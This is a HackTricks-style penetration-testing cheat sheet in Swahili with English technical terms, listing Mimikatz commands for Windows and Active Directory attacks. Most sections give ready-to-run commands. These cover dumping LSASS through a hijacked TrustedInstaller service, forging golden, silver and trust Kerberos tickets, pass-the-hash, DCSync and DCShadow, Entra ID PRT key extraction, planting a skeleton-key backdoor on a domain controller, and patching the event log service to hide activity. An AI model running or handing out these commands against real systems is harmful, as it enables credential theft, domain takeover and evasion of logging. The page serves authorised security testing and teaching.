# Mimikatz

{{#include ../../banners/hacktricks-training.md}}


**Ukurasa huu umejengwa kutokana na ukurasa mmoja wa [adsecurity.org](https://adsecurity.org/?page_id=1821)**. Angalia wa awali kwa maelezo zaidi!<sup>[[3]](#references)</sup>

## LM na Clear-Text kwenye memory

Kuanzia Windows 8.1 na Windows Server 2012 R2, hatua muhimu zimetekelezwa ili kulinda dhidi ya credential theft:

- **LM hashes na plain-text passwords** hazihifadhiwi tena kwenye memory ili kuimarisha security. Registry setting maalum, _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_ lazima isanidiwe kwa DWORD value ya `0` ili kuzima Digest Authentication, na kuhakikisha passwords za "clear-text" hazicachewi kwenye LSASS.

- **LSA Protection** imeanzishwa ili kulinda process ya Local Security Authority (LSA) dhidi ya memory reading na code injection zisizoidhinishwa. Hili hufanyika kwa kuweka LSASS kama protected process. Kuactivate LSA Protection kunahusisha:
1. Kubadilisha registry kwenye _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ kwa kuweka `RunAsPPL` kuwa `dword:00000001`.
2. Kutekeleza Group Policy Object (GPO) inayolazimisha registry change hii kwenye devices zinazosimamiwa.

Licha ya protections hizi, tools kama Mimikatz zinaweza kupita LSA Protection kwa kutumia drivers maalum, ingawa vitendo kama hivyo huenda vikaandikwa kwenye event logs.

Kwenye workstations za kisasa, hili ni muhimu zaidi kwa sababu **Credential Guard imewezeshwa kwa default kwenye Windows 11 22H2+ nyingi na Windows Server 2025 domain-joined, non-DC systems**, huku **LSASS-as-PPL ikiwa imewezeshwa kwa default kwenye fresh Windows 11 22H2+ installs**. Kwa vitendo, hii inamaanisha `sekurlsa::logonpasswords` mara nyingi hutoa material kidogo kuliko ilivyotarajiwa na tradecraft ya zamani, na operators wanazidi kuhamia kwenye **offline minidumps**, **Kerberos key extraction (`sekurlsa::ekeys`)**, au **CloudAP/PRT-oriented modules**. Kwa upande wa protection, angalia [Windows credentials protections](credentials-protections.md).

### Counteracting SeDebugPrivilege Removal

Administrators kwa kawaida wana SeDebugPrivilege, inayowawezesha kudebug programs. Privilege hii inaweza kuzuiwa ili kuzuia unauthorized memory dumps, ambayo ni technique ya kawaida inayotumiwa na attackers kutoa credentials kutoka kwenye memory. Hata hivyo, privilege hii ikiondolewa, account ya TrustedInstaller bado inaweza kufanya memory dumps kwa kutumia service configuration iliyobinafsishwa:
```bash
sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
sc start TrustedInstaller
```
Hii inaruhusu kutupwa kwa memory ya `lsass.exe` kwenye faili, ambayo inaweza kuchanganuliwa kwenye mfumo mwingine ili kutoa credentials:
```
# privilege::debug
# sekurlsa::minidump lsass.dmp
# sekurlsa::logonpasswords
```
## Chaguo za Mimikatz

Kuharibu event log katika Mimikatz kunahusisha vitendo viwili vya msingi: kufuta event log na ku-patch huduma ya Event ili kuzuia kurekodiwa kwa events mpya. Hapa chini kuna commands za kutekeleza vitendo hivi:

#### Kufuta Event Logs

- **Command**: Kitendo hiki kinalenga kufuta event logs, hivyo kufanya iwe vigumu kufuatilia shughuli hasidi.
- Mimikatz haitoi command ya moja kwa moja katika documentation yake ya kawaida ya kufuta event logs kupitia command line. Hata hivyo, udukuzi wa event logs kwa kawaida huhusisha kutumia system tools au scripts nje ya Mimikatz ili kufuta logs maalum (kwa mfano, kwa kutumia PowerShell au Windows Event Viewer).

#### Experimental Feature: Ku-patch Event Service

- **Command**: `event::drop`
- Command hii ya majaribio imeundwa kubadilisha tabia ya Event Logging Service, na kuizuia kurekodi events mpya.
- Mfano: `mimikatz "privilege::debug" "event::drop" exit`

- Command ya `privilege::debug` huhakikisha kuwa Mimikatz ina privileges zinazohitajika za kurekebisha system services.
- Command ya `event::drop` kisha hu-patch Event Logging service.

### Kerberos Ticket Attacks

Tumia commands zilizo hapa chini kama vikumbusho vya haraka vya syntax. Kurasa maalum za [golden tickets](../active-directory-methodology/golden-ticket.md), [silver tickets](../active-directory-methodology/silver-ticket.md), [diamond tickets](../active-directory-methodology/diamond-ticket.md), na [over-pass-the-hash / pass-the-key](../active-directory-methodology/over-pass-the-hash-pass-the-key.md) zina maelezo ya kisasa kuhusu nuances za AES/PAC/opsec.

### Kuunda Golden Ticket

Golden Ticket huruhusu impersonation yenye access katika domain nzima. Command na parameters muhimu:

- Command: `kerberos::golden`
- Parameters:
- `/domain`: Jina la domain.
- `/sid`: Security Identifier (SID) ya domain.
- `/user`: Username ya ku-impersonate.
- `/krbtgt`: NTLM hash ya domain KDC service account.
- `/ptt`: Hu-inject ticket moja kwa moja kwenye memory.
- `/ticket`: Huhifadhi ticket kwa matumizi ya baadaye.

Mfano:
```bash
mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
```
### Silver Ticket Creation

Silver Tickets hutoa access kwa services mahususi. Command na parameters muhimu:

- Command: Inafanana na Golden Ticket lakini inalenga services mahususi.
- Parameters:
- `/service`: Service ya kulenga (mfano, cifs, http).
- Parameters nyingine zinazofanana na za Golden Ticket.

Example:
```bash
mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
```
### Trust Ticket Creation

Trust Tickets hutumika kufikia resources katika domains mbalimbali kwa kutumia trust relationships. Command na parameters muhimu:

- Command: Inafanana na Golden Ticket, lakini hutumika kwa trust relationships.
- Parameters:
- `/target`: FQDN ya domain lengwa.
- `/rc4`: NTLM hash ya trust account.

Example:
```bash
mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit
```
### Amri za Ziada za Kerberos

- **Listing Tickets**:

- Amri: `kerberos::list`
- Huorodhesha tiketi zote za Kerberos za session ya sasa ya mtumiaji.

- **Pass the Cache**:

- Amri: `kerberos::ptc`
- HuInject tiketi za Kerberos kutoka kwenye cache files.
- Mfano: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`

- **Pass the Ticket**:

- Amri: `kerberos::ptt`
- Huruhusu kutumia tiketi ya Kerberos katika session nyingine.
- Mfano: `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`

- **Purge Tickets**:
- Amri: `kerberos::purge`
- Huondoa tiketi zote za Kerberos kwenye session.
- Ni muhimu kabla ya kutumia amri za ticket manipulation ili kuepuka migongano.

### Over-Pass-the-Hash / Pass-the-Key

Ikiwa `RC4` imezimwa au haitegemeki, Mimikatz inaweza kupachika **AES128/AES256 Kerberos keys** kwenye logon session ya sasa badala ya kutumia NT hash pekee. Hii kwa kawaida inafaa zaidi kwa domains za kisasa kuliko kuchukulia `sekurlsa::pth` kuwa ya NTLM pekee.<sup>[[1]](#references)</sup>
```bash
mimikatz "privilege::debug" "sekurlsa::ekeys" exit
mimikatz "sekurlsa::pth /user:svc_sql /domain:corp.local /aes256:<AES256_HEX> /run:powershell.exe" exit
mimikatz "sekurlsa::pth /user:administrator /domain:corp.local /ntlm:<NT_HASH> /impersonate" exit
```
`/impersonate` hutumia tena mchakato wa sasa badala ya kuanzisha console mpya, jambo linalofaa unapotaka kuendesha mara moja vitu kama `lsadump::dcsync` katika muktadha huo huo.

### Udukuzi wa Active Directory

- **DCShadow**: Fanya mashine itende kwa muda kama DC kwa ajili ya manipulation ya objects za AD. See [DCShadow](../active-directory-methodology/dcshadow.md).

- `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`

- **DCSync**: Iga DC ili kuomba data ya passwords. See [DCSync](../active-directory-methodology/dcsync.md).
- `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`

### Ufikiaji wa credentials

- **LSADUMP::LSA**: Toa credentials kutoka kwa LSA.

- `mimikatz "lsadump::lsa /inject" exit`

- **LSADUMP::NetSync**: Iga DC kwa kutumia data ya password ya computer account.

- _Hakuna command maalum iliyotolewa kwa NetSync katika context ya awali._

- **LSADUMP::SAM**: Fikia database ya ndani ya SAM.

- `mimikatz "lsadump::sam" exit`

- **LSADUMP::Secrets**: Decrypt secrets zilizohifadhiwa kwenye registry.

- `mimikatz "lsadump::secrets" exit`

- **LSADUMP::SetNTLM**: Weka NTLM hash mpya kwa user.

- `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`

- **LSADUMP::Trust**: Pata taarifa za authentication za trust.
- `mimikatz "lsadump::trust" exit`

### Cloud credentials / Entra ID

Kwenye hosts za **Entra ID** au **hybrid-joined**, `sekurlsa::cloudap` inaweza kufichua material ya **Primary Refresh Token (PRT)** iliyohifadhiwa kutoka LSASS. Ikiwa key inayohusishwa ya Proof-of-Possession inalindwa na software, `dpapi::cloudapkd` inaweza kupata key material iliyo wazi/iliyoderived inayohitajika kwa workflows za baadaye za **Pass-the-PRT**.<sup>[[1]](#references)</sup>
```bash
mimikatz "privilege::debug" "sekurlsa::cloudap" exit
mimikatz "dpapi::cloudapkd /keyvalue:<ProofOfPossessionKey> /unprotect" exit
mimikatz "dpapi::cloudapkd /context:<CONTEXT> /derivedkey:<DERIVED_KEY> /prt:<PRT>" exit
```
Hili huwa gumu zaidi wakati key inaungwa mkono na TPM, lakini inafaa kuichunguza kwenye hybrid endpoints kwa sababu data ya CloudAP iliyohifadhiwa kwenye cache inaweza kuwa ya kuvutia zaidi kuliko output ya kawaida ya `wdigest`.<sup>[[2]](#references)</sup> Kwa cloud-side abuse chain, tazama [Pass the PRT](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/pass-the-prt.html).

### Mbalimbali

- **MISC::Skeleton**: Ingiza backdoor kwenye LSASS kwenye DC.
- `mimikatz "privilege::debug" "misc::skeleton" exit`

### Privilege Escalation

- **PRIVILEGE::Backup**: Pata haki za backup.

- `mimikatz "privilege::backup" exit`

- **PRIVILEGE::Debug**: Pata debug privileges.
- `mimikatz "privilege::debug" exit`

### Credential Dumping

- **SEKURLSA::LogonPasswords**: Onyesha credentials za users walioingia kwenye mfumo.

- `mimikatz "sekurlsa::logonpasswords" exit`

- **SEKURLSA::Tickets**: Toa Kerberos tickets kutoka kwenye memory.
- `mimikatz "sekurlsa::tickets /export" exit`

### Sid and Token Manipulation

- **SID::add/modify**: Badilisha SID na SIDHistory.

- Add: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
- Modify: _Hakuna command maalum ya modify katika original context._

- **TOKEN::Elevate**: Jifanya kuwa token nyingine.
- `mimikatz "token::elevate /domainadmin" exit`

### Terminal Services

- **TS::MultiRDP**: Ruhusu RDP sessions nyingi.

- `mimikatz "ts::multirdp" exit`

- **TS::Sessions**: Orodhesha TS/RDP sessions.
- _Hakuna command maalum iliyotolewa kwa TS::Sessions katika original context._

### Vault

- Toa passwords kutoka Windows Vault.
- `mimikatz "vault::cred /patch" exit`


## Marejeo

- [1] [The Hacker Tools – Mimikatz modules](https://tools.thehacker.recipes/mimikatz/modules/)
- [2] [Synacktiv – WHFB and Entra ID: Say Hello to your new cache flow](https://www.synacktiv.com/en/publications/whfb-and-entra-id-say-hello-to-your-new-cache-flow)
- [3] [Mimikatz command reference](https://adsecurity.org/?page_id=1821)

{{#include ../../banners/hacktricks-training.md}}
